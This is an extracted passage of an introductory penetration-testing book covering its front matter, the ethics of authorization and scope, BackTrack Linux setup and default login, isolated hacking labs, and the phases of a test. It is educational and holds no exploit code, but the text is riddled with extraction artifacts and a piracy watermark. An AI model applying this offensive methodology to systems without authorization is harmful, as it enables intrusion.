[{"pageNumber":2,"pageContent":"The Basics of hacking and penetration T esting D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":3,"pageContent":"This page intentionally left blank"},{"pageNumber":4,"pageContent":"The Basics of hacking and penetration T esting Ethical hacking and penetration Testing Made Easy Patrick Engebretson Technical Editor James Broad Amsterd A m • Boston • Heidel Berg • london • new York oxford • P A ris • sAn diego • sAn frAncisco s ingAPore • sYdneY • t ok Y o Syngress Press is an imprint of Elsevier"},{"pageNumber":5,"pageContent":"f or information on all syngress publications visit our website at www.syngress.com Acquiring Editor: Angelina Ward Development Editor: Heather Scherer Project Manager: Jessica Vaughan Designer: Alisa Andreola Syngress is an imprint of elsevier 225 wyman street, waltham, mA 02451, U sA © 2011 elsevier inc. All rights reserved n o part of this publication may be reproduced or transmitted in any form or by any means, electronic or mechanical, including photocopying, recording, or any information storage and retrieval system, without permission in writing from the publisher. details on how to seek permission, further information about the Publisher’s permissions policies and our arrangements with organizations such as the copyright clearance center and the copyright licensing Agency, can be found at our website: www.elsevier.com/permissions. t his book and the individual contributions contained in it are protected under copyright by the Publisher (other than as may be noted herein). Notices k nowledge and best practice in this field are constantly changing. As new research and experience broaden our understanding, changes in research methods or professional practices, may become necessary. Practitioners and researchers must always rely on their own experience and knowledge in evaluating and using any information or methods described herein. in using such information or methods they should be mindful of their own safety and the safety of others, including parties for whom they have a professional responsibility. to the fullest extent of the la w, neither the Publisher nor the authors, contributors, or editors, assume any liability for any injury and/or damage to persons or property as a matter of products liability, negligence or otherwise, or from any use or operation of any methods, products, instructions, or ideas contained in the material herein. Library of Congress Cataloging-in-Publication Data e ngebretson, Pat (Patrick Henry), 1974- the basics of hacking and penetration testing : ethical hacking and penetration testing made easy / Patrick e ngebretson. p. cm. – ( syngress basics series) includes bibliographical references and index. isBn 978-1-59749-655-1 (alk. paper) 1. computer security. 2. computer hackers. 3. computer software– testing. 4. computer crimes– Prevention. i. title. QA76.9.A25 e5443 2010 00 5.8–dc23 2 011018388 British Library Cataloguing-in-Publication Data A catalogue record for this book is available from the British library is Bn: 978-1-59749-655-1 Printed in the United states of America 11 12 13 14 15 1 0 9 8 7 6 5 4 3 2 1"},{"pageNumber":6,"pageContent":"t his book is dedicated to g od, l orianna, m aggie, and m olly. You are the steel cables that bind me. i love you. Dedication v"},{"pageNumber":7,"pageContent":"This page intentionally left blank"},{"pageNumber":8,"pageContent":"ACKNOWLEDGMENTS .............................................................................. ix ABOUT T hE AUT hOR ............................................................................... xi ABOUT T hE TEC hNICAL EDITOR ............................................................ xiii INTR ODUCTION ...................................................................................... xv C hApTER 1 What Is penetration T esting? ................................................1 C hApTER 2 Reconnaissance .................................................................15 C hApTER 3 Scanning ............................................................................ 43 ChApTER 4 Exploitation ........................................................................ 65 ChApTER 5 W eb- Based Exploitation ....................................................107 C hApTER 6 Maintaining Access with Backdoor s and Rootkits ..............127 C hApTER 7 Wrapping Up the penetration T est .....................................145 INDEX .................................................................................................. 157 Contents vii"},{"pageNumber":9,"pageContent":"This page intentionally left blank"},{"pageNumber":10,"pageContent":"l ike most people, i have a list. t he list is made up of life goals and dreams— things i would like to accomplish at some point in my life. s ome of the items on the list are big, some small, some well-defined, stable, and concrete, whereas others are more transient and ambiguous—like early morning fog on the l utsen m ountains, constantly changing and moving, sometimes even disappearing altogether only to reappear at a later date and time. o bviously, the list is not a stone tablet; it changes and updates as i move through life. A few things, however, have never moved off the list; they stand as the m ount rushmore’ s in my life. Hundreds of feet high, carved into solid granite. n ever changing. Always there. t hey gracefully weather the storms and vicissitudes of life and simply wait to be crossed off. s ome are nobler, some are egotistical, and some are even whimsical. i have had the good fortune in my life to be able to cross off many of the items on my list. e ven the big ones. t his book repre- sents the crossing off of one of my “ rushmore” items. A presidential face to be sure (although i am not sure which face it actually represents!). As with most things in life, this book, the end product that you see, is the cul- mination of many people’s efforts and energies. s o while i do get to cross this off my list, and while my name appears on the cover, please do not take that to mean that this book is my sole creation. w ithout the dedication, support, help, and advice from everyone involved, there is no doubt you would not be reading these words right now. writing a proper “Acknowledgments” section by truly listing everyone involved would fill many, many pages—below you will find a simple attempt to say thanks. i apologize in advance if i forgot to mention anyone. My W IfE what can i say that would justify or somehow verbalize what you mean to me? t here is no doubt that this book is as much an effort on your part as mine. You gave me the wings of encouragement to fly and the dedication of long lonely days and nights while i worked on it. You never complained, never resisted, and were never upset when i needed more from you. e very man should be so lucky. i am who i am because of you. thank you. My G IRLS to my little l iebchens—you are the light of my life! i apologize for all early mornings, late nights, and long weekends. Bring on the sunroom, l ittle People, Acknowledgments ix"},{"pageNumber":11,"pageContent":"Acknowledgments x mary and Joseph, princesses, Barbie’s, and the Pirate s hip! d addy loves you more than life itself. My fAMIL y thanks to my mother and father for the gift of education and teaching me to understand the value of hard work and dedication to a project. t hanks also to my other mother, who dedicated countless hours to reading and correcting my initial rough drafts. TO ThE Sy NGRESS TEAM thanks for the opportunity! t hanks to the editing team; i appreciate all the hard work and dedication you gave to this project. s pecial thanks to Angelina ward who ultimately earned a green light for the project, to Heather s cherer, my editor, for the countless hours and assistance, and to James Broad for the excellent eye and great suggestions throughout the technical review process. to keep up with news and happenings about the book, or other security- related content, feel free to follow: pengebretson on twitter or visit my home - page: http://homepages .dsu.edu/pengebretson"},{"pageNumber":12,"pageContent":"Dr. Patrick Engebretson obtained his d octor of s cience degree with a spe- cialization in information security from d akota s tate University. He currently serves as an assistant professor of information assurance and also works as a senior penetration tester for a security firm in the m idwest. His research inter- ests include penetration testing, hacking, intrusion detection, exploitation, honey pots, and malware. i n the past several years, he has published many peer-reviewed journal and conference papers in these areas. He has been invited by the d epartment of Homeland s ecurity to share his research at the s oftware Assurance forum in washington, dc , and has also spoken at Black Hat in l as Vegas. He regularly attends advanced exploitation and penetration testing trainings from industry-recognized professionals and holds several cer- tifications. He teaches graduate and undergraduate courses in penetration test- ing, wireless security, and intrusion detection, and advanced exploitation. xi About the Author"},{"pageNumber":13,"pageContent":"This page intentionally left blank D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":14,"pageContent":"xiii James Broad ( c iss P , c|eH , c) Pt s, se curity  , mB A) is the President and owner of cy ber- re con, l lc , where he and his team of consultants special- ize in in formation se curity, in formation Assurance, and ce rtification and Accreditation and offer other security consultancy services to corporate and gov- ernment clients. As a security professional with over 20 years of real-world it experience, James is an expert in many areas of it security, specializing in security engineering, penetration testing, and vulnerability analysis and research. He has provided security services in the n ation’s most critical sectors including defense, law enforcement, intelligence, finance, and healthcare. James has a ma ster’s of Business Administration degree with specialization in in formation te chnology ( mB A/ i t) from the ke n Blanchard co llege of Business, Bachelor’s degrees in co mputer Programming and se curity ma nagement from so uthwestern University and is currently a do ctoral le arner pursuing a Ph. d. i n in formation se curity from ca pella University. He is a member of i ss A and (i sc ) 2 ® . James currently resides in st afford, Virginia with his family: de anne, mi cheal, and te mara. About the Technical Editor xiii"},{"pageNumber":15,"pageContent":"This page intentionally left blank"},{"pageNumber":16,"pageContent":"i suppose there are several questions that may be running through your head as you contemplate reading this book: w ho is the intended audience for this book? How is this book different from book ‘x’ (insert your favorite title here)? w hy should i buy it? Because these are all fair questions and i am asking you to plunk down your hard-earned cash, it is important to provide some answers to these questions. for people who are interested in learning about hacking and penetration test- ing, walking into a well-stocked bookstore can be as confusing as searching for “hacking” books at amazon.com. i nitially, there appears to be an almost endless selection to choose from. m ost large bookstores have several shelves dedicated to computer security books. t hey include books on programming security, web application security, rootkits and malware, penetration testing, and, of course, hacking. However, even the hacking books seem to vary in con- tent and subject matter. s ome books focus on using tools but do not discuss how these tools fit together. o ther books focus on hacking a particular subject but lack the broad picture. t his book is intended to address these issues. i t is meant to be a single starting point for anyone interested in the topics of hacking or penetration testing. t he book will certainly cover specific tools and topics but will also examine how the tools fit together and how they rely on one another to be successful. Wh O IS ThE INTENDED AUDIENCE fOR ThIS BOOK ? this book is meant to be a very gentle yet thorough guide to the world of hack- ing and penetration testing. i t is specifically aimed at helping you master the basic steps needed to complete a hack or penetration test without overwhelm- ing you. By the time you finish this book, you will have a solid understanding of the penetration testing process and you will be comfortable with the basic tools needed to complete the job. s pecifically, this book is aimed at people who are new to the world of hack- ing and penetration testing, for those with little or no previous experience, for those who are frustrated by the inability to see the big picture (how the various tools and phases fit together), or for those looking to expand their knowledge of offensive security. i n short this book is written for anyone who is interested in computer secu- rity, hacking, or penetration testing but has no prior experience and is not sure where to begin. A colleague and i call this concept “zero entry hacking” (Z eH), xv Introduction"},{"pageNumber":17,"pageContent":"Introduction xvi much like modern-day swimming pools. Zero entry pools gradually slope from the dry end to the deep end, allowing swimmers to wade in without feeling overwhelmed or without having a fear of drowning. t he “zero entry” concept allows everyone the ability to use the pool regardless of age or swimming abil- ity. t his book employs a similar technique. Z eH is designed to expose you to the basic concepts without overwhelming you. c ompletion of Z eH will pre- pare you for advanced courses and books. hOW IS ThIS BOOK DIffERENT fROM BOOK ‘X’? wh en not spending time with my family, there are two things i enjoy doing: reading and hacking. mo st of the time, i combine these hobbies by reading about hacking. As a professor and a penetration tester, you can imagine that my bookshelf is lined with many books on hacking, security, and penetration test- ing. As with most things in life, the quality and value of every book is different. so me books are excellent resources that have been used so many times that the bindings are literally falling apart. ot hers are less helpful and remain in nearly new condition. A book that does a good job of explaining the details without losing the reader is worth its weight in gold. Unfortunately, most of my per- sonal favorites, those that are worn and tattered, are either very lengthy (500  p ages) or very focused (an in-depth guide to a single topic). ne ither of these is a bad thing; in fact, quite the opposite, it is the level of detail and the clarity of the authors’ explanation that make them so great. But at the same time, a very large tome focused on a detailed subject of security can seem overwhelming to newcomers. Unfortunately, as a beginner trying to break into the security field and learn the basics of hacking, tackling one of these books can be both daunting and confusing. t his book is different from other publications in two ways. f irst, it is meant for beginners; recall the concept of “zero entry.” i f you have never per- formed any type of hacking or you have used a few tools but are not quite sure what to do next (or how to interpret the results of the tool), this book is for you. t he goal is not to bury you with details but to present a broad overview of the entire field. n aturally, the book will still cover each of the major tools needed to complete the steps in a penetration test, but it will not stop to examine all the in-depth or additional functionality for each of these tools. t his will be helpful from the standpoint that it will focus on the basics, and in most cases allow us to avoid confusion caused by advanced features or minor differences in tool versions. fo r example, when we discuss port scanning, the chapter will discuss how to run the basic scans with the very popular port scanner nm ap. Because the book focuses on the basics, it becomes less important exactly which version of nm ap the user is running. ru nning a sYn scan using nm ap is exactly the same regard- less of whether you are conducting your scan with nm ap version 2 or version 5. th is technique will be employed as often as possible, doing so should allow the"},{"pageNumber":18,"pageContent":"Introduction xvii reader to learn nm ap (or any tool) without having to worry about the changes in functionality that often accompany advanced features in version changes. th e goal of this book is to provide general knowledge that will allow you to tackle advanced topics and books. re member, once you have a firm grasp of the basics, you can always go back and learn the specific details and advanced features of a tool. in addition, each chapter will end with a list of suggested tools and topics that are outside the scope of this book but can be used for fur- ther study and to advance your knowledge. Beyond just being written for beginners, this book actually presents the infor- mation in a very unique way. All the tools and techniques we use in this book will be carried out in a specific order against a small number of related targets (all target machines will belong to the same subnet, and the reader will be able to easily recreate this “target” network to follow along). re aders will be shown how to interpret tool output and how to utilize that output to continue the attack from one chapter to the next. th e use of a sequential and singular rolling example throughout the book will help readers see the big picture and better comprehend how the various tools and phases fit together. th is is different from many other books on the mar- ket today, which often discuss various tools and attacks but fail to explain how those tools can be effectively chained together. Presenting information in a way that shows the user how to clearly move from one phase to another will provide valuable experience and allow the reader to complete an entire pene- tration test by simply following along with the examples in the book. th is con- cept should allow the reader to get a clear understanding of the fundamental knowledge while learning how the various tools and phases connect. Why ShOULD I BU y ThIS BOOK ? even though the immediate answers to this question are highlighted in the preceding sections , below you will find a condensed list of reasons: n Y ou want to learn more about hacking and penetration testing but you are unsure of where to start. n Y ou have dabbled in hacking and penetration testing but you are not sure how all the pieces fit together. n Y ou want to learn more about the tools and processes that are used by hackers and penetration testers to gain access to networks and systems. n Y ou are looking for a good place to start building offensive security knowledge. n Y ou enjoy a challenge."},{"pageNumber":19,"pageContent":"This page intentionally left blank"},{"pageNumber":20,"pageContent":"1 INTRODUCTION Penetration testing can be defined as a legal and authorized attempt to locate and successfully exploit computer systems for the purpose of making those sys- tems more secure. t he process includes probing for vulnerabilities as well as providing proof of concept (P oc) attacks to demonstrate the vulnerabilities are real. Proper penetration testing always ends with specific recommendations for addressing and fixing the issues that were discovered during the test. o n the whole, this process is used to help secure computers and networks against future attacks. Penetration testing is also known as n P en testing n P t n Hacking n e thical Hacking n w hite Hat Hacking i t is important to spend a few moments discussing the difference between pen- etration testing and vulnerability assessment. m any people (and vendors) in the security community incorrectly use these terms interchangeably. A vulner- ability assessment is the process of reviewing services and systems for poten- tial security issues, whereas a penetration test actually performs exploitation and P oc attacks to prove that a security issue exists. Penetration tests go a step What Is penetration T esting? ChApTER 1 Information in This Chapter: n Introduction to Backtrack Linux: T ools. Lots of Tools n W orking with Backtrack: Starting the Engine n The Use and Creation of a Hacking Lab n Phases of a P enetration Test"},{"pageNumber":21,"pageContent":"The Basics of hacking and penetration T esting 2 beyond vulnerability assessments by simulating hacker activity and delivering live payloads. i n this book, we will cover the process of vulnerability assess- ment as one of the steps utilized to complete a penetration test. Setting the Stage Understanding all the various players and positions in the world of hacking and penetration testing is central to comprehending the big picture. l et us start by painting the picture with broad brush strokes. Please understand that the following is a gross oversimplification; however, it should help you see the dif- ferences between the various groups of people involved. i t may help to consider the Star Wars universe where there are two sides of the “force”: Jedis and s iths. g ood vs. e vil. Both sides have access to an incredible power. o ne side uses its power to protect and serve, whereas the other side uses it for personal gain and exploitation. le arning to hack is much like learning to use the force (or so i imagine!). th e more you learn, the more power you have. ev entually, you will have to decide whether you will use your power for good or bad. th ere is a classic poster from the Star Wars ep isode i movie that depicts Anakin as a young boy. if you look closely at Anakin’s shadow in the poster, you will see it is the outline of da rth Vader. tr y searching the in ternet for “Anakin da rth Vader shadow” to see it. Understanding why this poster has appeal is critical. As a boy, Anakin had no aspirations of becoming da rth Vader, but it happened nonetheless. i t is probably safe to assume that very few people get into hacking to become a super villain. t he problem is that journey to the darkside is a slippery slope. However, if you want to be great, have the respect of your peers, and be gain- fully employed in the security workforce, you need to commit yourself to using your powers to protect and serve. Having a felony on your record is a one-way ticket to another profession. i t is true that there is currently a shortage of quali- fied security experts, but even so, not many employers today are willing to take a chance, especially if those crimes involve computers. in the pen testing world, it is not uncommon to hear the terms “white hat” and “black hat” to describe the Jedis and si ths. th roughout this book, the terms “white hat,” “ethical hacker,” or “penetration tester” will be used interchange- ably to describe the Jedis. th e si ths will be referred to as “black hats,” “crack- ers,” or “malicious attackers.” it is important to note that ethical hackers complete many of the same activi- ties with many of the same tools as malicious attackers. in nearly every situ- ation, an ethical hacker should strive to act and think like a real black hat hacker. th e closer the penetration test simulates a real-world attack, the more value it provides to the customer paying for the P t. P lease note how the previous paragraph says “in nearly every situation.” ev en though white hats complete many of the same tasks with many of the same tools, there is a world of difference between the two sides. At its core, these"},{"pageNumber":22,"pageContent":"What Is penetration T esting? ChApTER 1 3 differences can be boiled down to three key points: authorization, motivation, and intent. it should be stressed that these points are not all inclusive, but they can be useful in determining if an activity is ethical or not. th e first and simplest way to differentiate between white hats and black hats is authorization. Authorization is the process of obtaining approval before con- ducting any tests or attacks. on ce authorization is obtained, both the penetra- tion tester and the company being audited need to agree upon the scope of the test. th e scope includes specific information about the resources and systems to be included in the test. th e scope explicitly defines the authorized targets for the penetration tester. it is important that both sides fully understand the authorization and scope of the P t. wh ite hats must always respect the autho- rization and remain within the scope of the test. Black hats will have no such constraints on the target list. th e second way to differentiate between an ethical hacker and a malicious hacker is through examination of the attacker’s motivation. if the attacker is motivated or driven by personal gain, including profit through extortion or other devious methods of collecting money from the victim, revenge, fame, or the like, he or she should be considered a black hat. However, if the attacker is preauthorized and his or her motivation is to help the organization and improve their security, he or she can be considered a white hat. fi nally, if the intent is to provide the organization a realistic attack simula- tion so that the company can improve its security through early discovery and mitigation of vulnerabilities, the attacker should be considered a white hat. it is also important to comprehend the critical nature of keeping P t findings confidential. et hical hackers will never share sensitive information discovered during the process of a penetration testing with anyone other than the client. However, if the intent is to leverage information for personal profit or gain, the attacker should be considered a black hat. INTRODUCTION TO BACKTRACK LINUX: TOOLS. LOTS O f TOOLS A few years back, the open discussion or teaching of hacking techniques was considered a bit taboo. fo rtunately, times have changed and people are begin- ning to understand the value of offensive security. of fensive security is now being embraced by organizations regardless of size or industries. go vernments are also getting serious about offensive security. ma ny governments have gone on record stating they are actively building and developing offensive security capabilities. Ultimately, penetration testing should play an important role in the overall security of your organization. Just as policies, risk assessments, business con- tinuity planning, and disaster recovery have become integral components in keeping your organization safe and secure, penetration testing needs to be included in your overall security plan as well. Penetration testing allows you"},{"pageNumber":23,"pageContent":"The Basics of hacking and penetration T esting 4 to view your organization through the eyes of the enemy. t his process can lead to many surprising discoveries and give you the time needed to patch your sys- tems before a real attacker can strike. o ne of the great things about learning how to hack today is the plethora and availability of good tools to perform your craft. n ot only are the tools read- ily available, but many of them are stable with several years of development behind them. m aybe even more important to many of you is the fact that most of these tools are available free of charge. for the purpose of this book, every tool covered will be free. i t is one thing to know a tool is free, it is another to find, compile, and install each of the tools required to complete even a basic penetration test. Although this process is quite simple on today’s modern l inux os ’s, it can still be a bit daunting for newcomers. m ost people who start are usually more interested in learning how to use the tools than they are in searching the vast corners of the i nternet locating and installing tools. to be fair, you really should learn how to manually compile and install soft- ware on a l inux machine; or at the very least, you should become familiar with apt-get (or the like). MORE ADvANCED APT, short for Advanced Package Tool, is a package management system. APT allows you to quickly and easily install, update, and remove software from the command line. Aside from its simplicity, one of the best things about APT is the fact that it automatically resolves dependency issues for you. This means that if the package you are installing requires additional software, APT will automatically locate and install the additional software. This is a massive improvement over the old days of “dependency hell.” Installing software with APT is very straightforward. For example, let us assume you want to install the classic network-mapping tool Cheops. Once you know the name of the package you want to install, from the command line you can run apt-get install followed by the name of the software you want to install. It is always a good idea to run apt-get update before installing software. This will ensure that you are getting the latest version available. To install Cheops, we would issue the following commands: apt-get update apt-get install cheops Before the package is installed, you will be shown how much disk space will be used and you will be asked if you want to continue. To install your new software, you can type “Y” and hit the enter key. If you prefer not to use the command line, there are several GUIs available for interacting with APT. The most popular graphical front end is currently Aptitude. Additional package managers are outside the scope of this book."},{"pageNumber":24,"pageContent":"What Is p enetration Testing? C h A p TER 1 5 A basic understanding of l inux will be beneficial and will pay you mountains of dividends in the long run. f or the purpose of this book, there will be no assumption that you have prior l inux experience, but do yourself a favor and commit yourself to becoming a l inux guru someday. t ake a class, read a book, or just explore on your own. t rust me , you will thank me later. i f you are inter- ested in penetration testing or hacking, there is no way of getting around the need to know l inux. f or tunately, the security community is a very active and very giving group. t he re are several organizations that have worked tirelessly to create various security-specific l in ux distributions. A distribution, or “distro” for short, is basi- cally a flavor, type, or brand of l in ux. Among the most well known of these penetration testing distributions is one called “Backtrack.” Backtrack l in ux is your one-stop shop for learning hacking and performing penetration testing. Backtrack l in ux reminds me of that scene in the first Matrix movie where t an k asks n eo “ w ha t do you need besides a miracle?” n eo responds with “ g un s. l ot s of g un s.” At this point in the movie, rows and rows of guns slide into view. e ve ry gun imaginable is available for n eo and t ri nity: handguns, rifles, shotguns, semiautomatic, automatic, big and small from pistols to explosives, an endless supply of different weapons from which to choose. t ha t is a similar experience most newcomers have when they first boot up Backtrack. “ t oo ls. l ot s of t oo ls.” Backtrack l inux is a hacker’s dream come true. t he entire distribution is built from the ground up for penetration testers. t he distribution comes preloaded with hundreds of security tools that are installed, configured, and ready to be used. Best of all, Backtrack is free! You can get your copy at http://www. Backtrack-linux.org/downloads/. n a vigating to the Backtrack link will allow you to choose from either an .iso or a V m w are image. i f you choose to download the .iso, you will need to burn the .iso to a d V d . i f you are unsure of how to complete this process, please g oogle “burning an iso.” o nce you have completed the burning process, you will have a bootable d V d . i n most cases, starting Backtrack from a bootable d V d is as simple as putting the d V d into the drive and restarting the machine. i n some instances, you may have to change the boot order in the B ios so that the opti- cal drive has the highest boot priority. i f you choose to download the V m wa re image, you will also need software capable of opening and deploying or running the image. l uc kily enough, there are several good tools for accomplishing this task. d ep ending on your prefer- ence, you can use V m wa re’s V m wa re Player, s un m ic rosystem’s VirtualBox, or m ic rosoft’s Virtual P c . i n reality, if you do not like any of those options, there are many other software options capable of running a V m i mage. You simply need to choose one that you are comfortable with. e ach of the three virtualization options listed above are available free of charge and will provide you with the ability to run V m images. You will need to D o w n l o a d f r o m W o w ! e B o o k < w w w . w o w e b o o k . c o m >"},{"pageNumber":25,"pageContent":"The Basics of hacking and penetration T esting 6 decide which version is best for you. t his book will rely heavily on the use of a Backtrack V mware image and V mware Player. At the time of writing, V mware Player was available at: http://www.vmware.com/products/player/. You will need to register for an account to download the software, but the registration process is simple and free. i f you are unsure of which option to choose, it is suggested that you go the Vmware route. n ot only is this another good technology to learn, but using Vms will allow you to set up an entire penetration testing lab on a single machine. i f that machine is a laptop, you essentially have a “travelling” P t lab so you can practice your skills anytime, anywhere. i f you choose to run Backtrack using the bootable dV d, shortly after the sys- tem starts, you will be presented with a menu list. You will need to review the list carefully, as it contains several different options. t he first couple of options are used to set some basic information about your system’s screen resolution. i f you are having trouble getting Backtrack to boot, be sure to choose the “ start Backtrack in s afe g raphical m ode.” t he menu contains several other options, but these are outside the scope of this book. to select the desired boot option, simply use the arrow keys to highlight the appropriate row and hit the enter key to confirm your selection. f igure 1.1 shows an example of the Backtrack boot screen. t he use of Backtrack is not required to work through this book or to learn the basics of hacking. Any version of l inux will do fine. t he major advantage of using Backtrack is that all the tools are preloaded for you. i f you choose to use a different version of l inux, you will need to install the tools before reading the chapter. i t is also important to remember that because this book focuses on the basics, it does not matter which version of Backtrack you are using. All the tools we will explore and use in this book are available in every version. WORKING WIT h BACKTRACK: STARTING T hE ENGINE regardless of whether you choose to run Backtrack as a V m or boot to a l ive dV d, once the initial system is loaded you will be presented with a log-in prompt. the default username is root and the default password is toor . f IGURE 1.1 A Screenshot Showing the Boot Options When Using the Live DVD."},{"pageNumber":26,"pageContent":"What Is penetration T esting? ChApTER 1 7 notice the default password is simply “root” spelled backward. t his default username and password combination has been in use since Backtrack 1, and most likely it will remain in use for future versions. At this point, you should be logged into the system and should be presented with “ root@bt:~# ” prompt. Although it is possible to run many of the tools we will discuss in this book directly from the terminal, it is often easier for newcomers to make use of the x w indow s ystem. You can start the g Ui by typing the following com- mand after the “ root@bt~# ” prompt: startx After typing this command and hitting the e nter key, x will begin to load. t his environment should seem vaguely familiar to most computer users. o nce it has completely loaded, you will see a desktop, icons, a task bar, and a system tray. Just like m icrosoft w indows, you can interact with these items by moving your mouse cursor and clicking on the desired object. m ost of the programs we will use in this book will be run out of the termi- nal. You can start a terminal session by either clicking on the black box located in the lower left in the taskbar, or by typing the following command into the launcher as shown in figure 1.2. konsole Unlike m icrosoft w indows or many of the modern-day l inux os ’s, by default, Backtrack does not come with networking enabled. t his setup is by design. As a penetration tester, we often try to maintain a stealthy or undetected pres- ence. n othing screams “ look A t me !! look A t me !! i ’m H ere!!!” like a computer that starts up and instantly begins spewing network traffic by broad- casting requests for a d HcP server and i P address. to avoid this issue, the net- working interfaces of your Backtrack machine are turned down (off) by default. t he easiest way to enable networking is through the terminal. o pen a terminal window by clicking on the terminal icon as shown by the leftmost arrow in f igure 1.2. once the terminal opens, enter the following command: ifconfig –a this command will list all the available interfaces for your machine. At a minimum, most machines will include an eth0 and a lo interface. t he “ lo ” f IGURE 1.2 Two Ways to Launch the Konsole (Terminal)."},{"pageNumber":27,"pageContent":"The Basics of hacking and penetration T esting 8 interface is your loopback interface. t he “ eth0 ” is your first ethernet card. d epending on your hardware, you may have additional interfaces or differ- ent interface numbers listed. i f you are running Backtrack through a V m, your main interface will usually be eth0. to turn the network card on, you enter the following command into a terminal window: ifconfig eth0 up let us examine this command in more detail; “ ifconfig ” is a l inux command that means “ i want to configure a network interface.” As we already know, “ eth0 ” is the first network device on our system (remember computers often start counting at 0 not 1), and the keyword “ up ” is used to activate the inter- face. s o we can roughly translate the command you entered as “ i want to con- figure the first interface to be turned on.” n ow that the interface is turned on, we need to get an i P address. t here are two basic ways to complete this task. o ur first option is to assign the address manually by appending the desired i P address to the end of the previous com- mand. for example, if we wanted to assign our network card an i P address of 192.168.1.23, we would type: ifconfig eth0 up 192.168.1.23 At this point, the machine will have an i P address but will still need a gateway and d omain n ame s ystem ( dns) server. A simple g oogle search for “setting up nic linux” will show you how to enter that information. You can always check to see if your commands worked by issuing the following command into a terminal window: ifconfig running this will allow you to see the current settings for your network inter- faces. Because this is a beginner’s guide and for the sake of simplicity, we will assume that stealth is not a concern at the moment. i n that case, the easiest way to get an address is to use d HcP. to assign an address through d HcP, you simply issue the command: dhclient eth0 Please note, this assumes you have already successfully run the command to turn up your network interface (eth0 in this case). n ow that we have successfully assigned an i P address, the last thing to address is how to turn off Backtrack. As with most things in l inux, there are multiple ways to accomplish this task. o ne of the easiest ways is to enter the following command into a terminal window: poweroff You can also substitute the poweroff command with the reboot command if you would prefer to restart the system rather than shut it down."},{"pageNumber":28,"pageContent":"What Is penetration T esting? ChApTER 1 9 Before proceeding, you should take several minutes to review and practice all the steps highlighted thus far including n P ower on/ start up Backtrack n l og in with the default user name and password n s tart x (the windows gUi) n View all the netw ork interfaces on your machine n t urn up (on) the desired netw ork interface n Assign an iP address manually n View the manually assigned iP address n Assign an iP address through dHcP n View the dynamically assigned address n r eboot the machine using the command line interface n P oweroff the machine using the command line interface ThE USE AND CREATION O f A hACKING LAB ev ery ethical hacker must have a place to practice and explore. mo st newcomers are confused about how they can learn to use hacking tools without breaking the law or attacking unauthorized targets. th is is most often accomplished through the creation of a personal “hacking lab.” A hacking lab is a sandboxed environ- ment where your traffic and attacks have no chance of escaping or reaching unau- thorized and unintended targets. in this environment, you are free to explore all the various tools and techniques without fear that some traffic or attack will escape your network. At a minimum, the lab is set up to contain at least two machines: one attacker and one victim. in other configurations, several victim machines can be deployed simultaneously to simulate a more realistic network. t he proper use and setup of a hacking lab is vital because one of the most effective means to learn something is by doing that thing. l earning and master- ing the basics of penetration testing is no different. th e single most crucial point of any hacker lab is the isolation of the network. You must configure your lab network in such a way that it is impossible for traffic to escape or travel outside of the network. mi stakes happen and even the most careful people can fat-finger or mistype an iP address. it is a simple mistake to mistype a single digit in an iP address, but that mistake can have drastic consequences for you and your future. it would be a shame (and more importantly illegal) for you to run a series of scans and attacks against what you thought was your hacker lab target with an iP address of 172.16.1.1 only to find out later that you actually entered the iP address as 122.16.1.1. t he simplest and most effective way to create a sandboxed or isolated environ- ment is to physically unplug or disconnect your network from the i nternet. i f you are using physical machines, it is best to rely on hardwired e thernet cables and switches to route traffic. Also be sure to double- and triple-check that all of your wireless nic s are turned off. Always carefully inspect and review your net- work for potential leaks before continuing."},{"pageNumber":29,"pageContent":"The Basics of hacking and penetration T esting 10 Although the use of physical machines to create a hacking lab is an accept- able solution, the use of virtual machines provides several key benefits. fi rst, given today’s processing power, it is easy to set up and create a mini hacking lab on a single machine or laptop. in most cases, an average machine can run two or three virtual machines simultaneously because our targets can be set up using minimal resources. ev en running on a laptop, it is possible to run two virtual machines at the same time. th e added benefit of using a laptop is the fact that your lab is portable. wi th the cheap cost of external storage today, it is easily possible to pack hundreds of virtual machines on a single external hard drive; these can be easily transported and set up in a matter of minutes. Anytime you are interested in practicing your skills or exploring a new tool, simply open up Backtrack and deploy a V m as a target. se tting up a lab like this gives you the ability to quickly plug-and-play with various operating systems and configurations. Another benefit of using virtual machines in your pen testing lab is the fact that it is very simple to sandbox your entire system. s imply turn off the wire- less card and unplug the cable from the i nternet. Your physical machine and virtual machines will still be able to communicate with each other and you can be certain that no attack traffic will leave your physical machine. i n general, penetration testing is a destructive process. m any of the tools and exploits we run can cause damage or take systems offline. i n some cases, it is easier to reinstall the os or program rather than attempt to repair it. t his is another area where V ms shine. rather than having to physically reinstall a pro- gram like s Ql server or even an entire operating system, the V m can be quickly reset or restored to its original configuration. ph ASES O f A pENETRATION TEST like most things, the overall process of penetration testing can be broken do wn into a series of steps or phases. w hen put together, these steps form a comprehensive methodology for completing a penetration test. c areful review of unclassified incident response reports or breech disclosures supports the idea that most black hat hackers also follow a process when attacking a target. t he use of an organized approach is important because it not only keeps the penetration tester focused and moving forward but also allows the results or output from each step to be used in the ensuing steps. t he use of a methodology allows you to break down a complex process into a series of smaller more manageable tasks. Understanding and following a meth- odology is an important step in mastering the basics of hacking. d epending on the literature or class you are taking, this methodology usually contains between four and seven steps or phases. Although the overall names or num- ber of steps can vary between methodologies, the important thing is that the process provides a complete overview of the penetration testing process."},{"pageNumber":30,"pageContent":"What Is penetration T esting? ChApTER 1 11 for example, some methodologies use the term “ information g athering,” whereas others call the same process “ reconnaissance .” for the purpose of this book, we will focus on the activities of the phase rather than the name. After you have mastered the basics, you can review the various penetration testing methodologies and choose one that you like best. to keep things simple, we will use a four-step process to explore and learn penetration testing. i f you search around and examine other methodologies (which is important to do), you may find processes that include more or less steps than we are using as well as different names for each of the phases. i t is important to understand that although the specific terminology may differ, most solid penetration testing methodologies cover the same topics. t here is one exception to this rule: the final step in many hacking methodolo- gies is a phase called “hiding,” “covering your tracks,” or “removing evidence.” Because this book focuses on understanding the basics, it will not be included in this methodology. o nce you have a solid understanding of the basics, you can go on to explore and learn more about this phase. t he remainder of this book will be dedicated to reviewing and teaching the fol- lowing steps: reconnaissance , s canning, e xploitation, and m aintaining Access. s ometimes, it helps to visualize these steps as an inverted triangle. f igure 1.3 demonstrates this approach. t he reason we use an inverted triangle is because the outcome of initial phases is very broad. As we move down into each phase, we continue to drill down to very specific details. th e inverted triangle works well because it represents our journey from the broad to the specific. fo r example, as we work through the reconnaissance phase, it 